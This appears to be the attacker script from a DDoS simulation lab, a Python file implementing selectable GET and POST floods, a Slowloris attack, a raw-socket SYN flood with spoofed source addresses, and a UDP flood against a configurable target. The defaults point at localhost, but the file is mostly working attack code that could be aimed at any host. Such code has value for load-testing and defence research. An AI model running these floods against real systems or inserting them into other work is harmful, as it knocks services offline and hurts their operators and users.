import requests
import time
import os
import logging
import socket
import random
import struct
import json
    
os.makedirs('logs', exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/attacker.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


target_url = os.getenv('TARGET_URL' , 'http://localhost:80/')
report_interval = 5
attacker_id = socket.gethostname()

stats = {
    'requests_sent': 0,
    'errors': 0,
    'response_times': []
}
last_report_time = time.time()

# env variables
attack_type = os.getenv('ATTACK_TYPE' , 'get_flood') # GEt default
SLOWLORIS_CONNECTIONS= int(os.getenv('SLOWLORIS_CONNECTIONS', '10'))   # connections per attacker
SLOWLORIS_INTERVAL = int(os.getenv('SLOWLORIS_INTERVAL', '10')) # secs bwn header chunks
SYN_FLOOD_RPS = int(os.getenv('SYN_FLOOD_RPS', '500'))
SPOOFED_IPS = os.getenv('SPOOFED_IPS', '').split(',') if os.getenv('SPOOFED_IPS') else []
stats_enabled = os.getenv('STATS_ENABLED', 'false').lower() == 'true'
stats_save = os.getenv('STATS_SAVE', 'false').lower() == 'true'
stats_interval = 5

target_endpoint = os.getenv('TARGET_ENDPOINT', '/')


def send_reports():
    """send metrics to cord"""

    global stats

    avg_response =sum(stats['response_times']) /len(stats['response_times']) if stats['response_times'] else 0
    payload = {
        'attacker_id': attacker_id,
        'requests_sent': stats['requests_sent'],
        'errors': stats['errors'],
        'avg_response_time_ms': avg_response
    }
    try: 
        requests.post(f"{target_url.rstrip('/')}/report",json=payload, timeout=2)
     #   logger.info(f"Reported: {stats['requests_sent']} requests, {stats['errors']} errors, {avg_response:.0f}ms avg")

    except requests.exceptions.RequestException as e :
        logger.error(f"Failed to send report: {e}")
    stats = {'requests_sent': 0, 'errors': 0, 'response_times':[]}
logger.info(f"Attacker {attacker_id} starting, targeting {target_url}")

def write_stats_to_log():
    """write stast to json log file if stats_save is enabled"""

    if not stats_save:
        return
    log_file = f"logs/attacker_{attacker_id}.json"
    stats_data = {
        'attacker_id':attacker_id,
        'timestamp': time.time(),
        'requests_sent': stats['requests_sent'],
        'errors': stats['errors'],
        'attack_type':attack_type
    }
    try:
        with open(log_file, 'w') as f:
            json.dump(stats_data, f , indent=2)
    except Exception as e :
        logger.debug(f"Failed to write stats: {e}")


def slowloris_attack():
    sockets =  []
    target_port = 80
    target_host = target_url.replace('http://','').replace('https://','').split('/')[0].split(':')[0]
    
    logger.info(f"[Slowloris] Starting attack against: {target_host}:{target_port}")
    logger.info(f"[Slowloris] Connections: {SLOWLORIS_CONNECTIONS}, Interval: {SLOWLORIS_INTERVAL}s")
    # open connection
    for _ in range(SLOWLORIS_CONNECTIONS):
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
            s.settimeout(SLOWLORIS_INTERVAL + 5)
            s.connect((target_host,target_port))
            initial_header = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {target_host}\r\n"
                f"User-Agent: Slowloris/{random.randint(1,10)}.{random.randint(1,10)}\r\n"
                f"Cache-Control: no-cache\r\n"
            )
            s.send(initial_header.encode())
            sockets.append(s)
            time.sleep(0.1)
        except socket.error as e:
            logger.error(f"[Slowloris] ✗ Failed to open:  {e}")
    logger.info(f"[Slowloris] Attack started! Holding {len(sockets)} connections...")

    reconnections = 0 
    while True:
        for i , sock in enumerate(sockets):
            try:
                header_chunk = f"X-{random.randint(1,9999)}:{random.randint(1,9999)}\r\n"
                sock.send(header_chunk.encode())
                time.sleep(SLOWLORIS_INTERVAL/max (len(sockets),1))
            except socket.error as e:
                logger.debug(f"[Slowloris] ✗ Connection #{i} lost: {e}")
                reconnections += 1 
                try:
                    new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    new_sock.settimeout(SLOWLORIS_INTERVAL + 5)
                    new_sock.connect((target_host,target_port))
                    initial_header = (
                        f"GET / HTTP/1.1\r\n"
                        f"Host: {target_host}\r\n"
                        f"User-Agent: Slowloris/Roconnect\r\n"
                    )
                    new_sock.send(initial_header.encode())
                    sockets[i] = new_sock
                    logger.debug(f"[Slowloris] ✓ Reconnected connection #{i}")

                except Exception as reconnect_error:
                    logger.debug(f"[Slowloris] ✗ Reconnect failed: {reconnect_error}")
        time.sleep(60)
        logger.info(f"[Slowloris] STATS: {len(sockets)} held, {reconnections} reconnections")


def calculate_checksum(data):
    if len(data) % 2 == 1:
        data += b'\x00'
    total = 0
    for i in range(0,len(data),2):
        word = (data[i] << 8 ) + data[i+ 1]
        total += word
    while (total >> 16 ) > 0:
        total = (total & 0xFFFF) + (total >> 16 )
    return ~total & 0xFFFF



def create_syn_packet(target_ip , target_port, source_ip=None):

    if source_ip and len(source_ip.strip()) > 0 :
        src_ip = source_ip.strip()
    else:
        src_ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    src_port = random.randint(49152, 65535)

    ip_header = struct.pack('!BBHHHBBH4s4s',
                            0x45,
                            0x00,
                            40,
                            random.randint(1,65535),
                            0x4000,
                            64,
                            6,
                            0,
                            socket.inet_aton(src_ip),
                            socket.inet_aton(target_ip)) 
    tcp_header = struct.pack('!HHLLBBHHH',
                             src_port,
                             target_port,
                             random.randint(0, 4294967295),
                             0,
                             0x50,
                             0x02,
                             65535,
                             0,0)
    pseudo_header = struct.pack('!4s4sBBH',
                                socket.inet_aton(src_ip),
                                socket.inet_aton(target_ip),
                                0,
                                6,
                                20)
    tcp_checksum = calculate_checksum(pseudo_header + tcp_header)

    tcp_header = struct.pack('!HHLLBBHHH',
                             src_port,
                             target_port,
                             random.randint(0, 4294967295),
                             0,
                             0x50,
                             0x02,
                             65535,
                             tcp_checksum,
                             0)
    ip_checksum = calculate_checksum(ip_header)
    
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            0x45,
                            0x00,
                            40,
                            random.randint(1,65535),
                            0x4000,
                            64,
                            6,
                            ip_checksum,
                            socket.inet_aton(src_ip),
                            socket.inet_aton(target_ip))
    return ip_header + tcp_header 


def syn_flood_attack():
    
    
    target_host = target_url.replace('http://','').replace('https://','').split('/')[0].split(':')[0]
    target_port = int(os.getenv('TARGET_PORT', '80'))
    logger.info(f"[SYN Flood] Starting attack against {target_host}:{target_port}")
    logger.info(f"[SYN Flood] Rate: {SYN_FLOOD_RPS} SYN packets/second")
    logger.info(f"[SYN Flood] Spoofed IPs: {'Enabled' if SPOOFED_IPS and SPOOFED_IPS[0] else 'Disabled'}")


    try:
        sock = socket.socket(socket.AF_INET , socket.SOCK_RAW , socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP , socket.IP_HDRINCL , 1)

        logger.info(f"[SYN Flood] ✓ Raw socket created")
    except PermissionError:
        logger.info(f"[SYN Flood] ✗ ERROR: Raw sockets require root/admin!")
        logger.error(f"[SYN Flood]    Run: sudo docker-compose up --build")
        return
    except socket.error as e:
        logger.error(f"[SYN Flood] ✗ ERROR: Failed to create raw socket: {e}")
        return
    stats = {'packets_sent': 0, 'errors' :0, 'start_time': time.time() }

    try:
        while True:
            for _ in range(SYN_FLOOD_RPS):
                try:
                    packet = create_syn_packet(
                        target_host,
                        target_port,
                        source_ip=random.choice(SPOOFED_IPS) if SPOOFED_IPS and SPOOFED_IPS[0] else None
                       )
                    sock.sendto(packet, (target_host,target_port))
                    stats['packets_sent'] += 1

                except socket.error as e:
                    stats['errors'] += 1
                    if stats['errors'] % 100 ==0 :
                        logger.debug(f"[SYN Flood] Send error: {e}")
                     
            time.sleep(1)

            if stats['packets_sent'] % (SYN_FLOOD_RPS * 10 ) == 10:
                elapsed = time.time() - stats['start_time']
                actual_rps = stats['packets_sent'] / elapsed if elapsed > 0 else 0
                logger.info(f"""[SYN Flood] STATS:
                            {stats['packets_sent']:,} packets, 
                            {actual_rps:,.0f} pkt/s, 
                            {stats['errors']} errors""")
    except KeyboardInterrupt:
        logger.info(f"[SYN Flood] Attack stopped by user")
        logger.info(f"[SYN Flood] Final: {stats['packets_sent']:,} packets sent")
    finally:
        sock.close()





def udp_flood_attack():
    
    
    target_host = target_url.replace('http://','').replace('https://','').split('/')[0].split(':')[0]
    target_port = int(os.getenv('TARGET_PORT', '80'))
    udp_flood_rps = int(os.getenv('UDP_FLOOD_RPS', '1000'))
    packet_size = int(os.getenv('UDP_PACKET_SIZE', '64'))

    logger.info(f"[UDP Flood] Starting attack against {target_host}:{target_port}")
    logger.info(f"[UDP Flood] Rate: {udp_flood_rps} packets/second")
    logger.info(f"[UDP Flood] Packet size: {packet_size} bytes")

    sock = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)

    stats = {'packets_sent': 0, 'errors': 0, 'start_time':time.time()}

    try:
        while True:
            for _ in range(udp_flood_rps):
                try:
                    payload = os.urandom(packet_size)
                    sock.sendto(payload, (target_host, target_port))
                    stats['packets_sent'] += 1
                except socket.error as e: 
                    stats['errors'] += 1 
            time.sleep(1)
            if stats['packets_sent'] % (udp_flood_rps * 10 ) == 0 :
                elapsed = time.time() - stats['start_time']
                actual_rps = stats['packets_sent'] / elapsed if elapsed > 0 else 0

                bandwidth_mbps = (stats['packets_sent']* packet_size * 8 / (elapsed * 1_000_000))
                logger.info(f"""[UDP Flood] STATS:
                             {stats['packets_sent']:,} packets,
                             {actual_rps:,.0f} pkt/s,
                             {bandwidth_mbps:.2f} Mbps,
                             {stats['errors']} errors""")
    except KeyboardInterrupt:
        logger.info(f"[UDP Flood] Attack stopped. Total: {stats['packets_sent']:,} packets")
    finally:
        sock.close()
while True: 
    try:
        start_time = time.time()
        time.sleep(0.001)
        if attack_type == 'post_flood' :
            payload = {'data': 'A' * 10240} #10KB
            response = requests.post(target_url + target_endpoint , json=payload , timeout=5)
        elif attack_type == 'slowloris':
            slowloris_attack()
        elif attack_type == 'syn_flood':
            syn_flood_attack()
        elif attack_type == 'udp_flood':
            udp_flood_attack()
                
        else:
            response = requests.get(target_url, timeout=5)
        
        # tracks response ms
        response_time_ms = (time.time() - start_time)*1000
        stats['response_times'].append(response_time_ms)
        stats['requests_sent'] += 1
        # check report time or not
        current_time = time.time()
        if current_time - last_report_time >= report_interval :
            send_reports()
            last_report_time = current_time
        if stats_enabled and stats['requests_sent'] % 100 == 0:
            logger.info(f"[STATS] {stats['requests_sent']} requests, {stats['errors']} errors")
        if stats_save and stats['requests_sent'] % 500 == 0:
            write_stats_to_log()
    except requests.exceptions.ConnectionError as e:
        stats['errors'] += 1
        logger.debug(f"Connection error: {e}")
    except requests.exceptions.Timeout as e:
        stats['errors'] += 1
        logger.debug(f"Timeout:  {e}")
    except Exception as e:
        stats['errors'] += 1
        logger.debug(f"Unexpected error:  {e}")
